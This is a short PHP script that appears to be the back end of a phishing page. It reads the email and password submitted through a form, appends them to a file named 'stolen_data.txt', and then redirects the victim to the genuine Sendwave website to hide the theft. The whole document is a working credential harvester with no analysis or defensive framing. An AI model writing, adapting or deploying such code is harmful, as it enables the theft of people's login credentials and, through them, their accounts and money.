<?php
$data = "[+] Email: " . $_POST['email'] . " | Password: " . $_POST['password'] . "\n";
file_put_contents("stolen_data.txt", $data, FILE_APPEND);
header("Location: https://www.sendwave.com"); 
exit;
?>
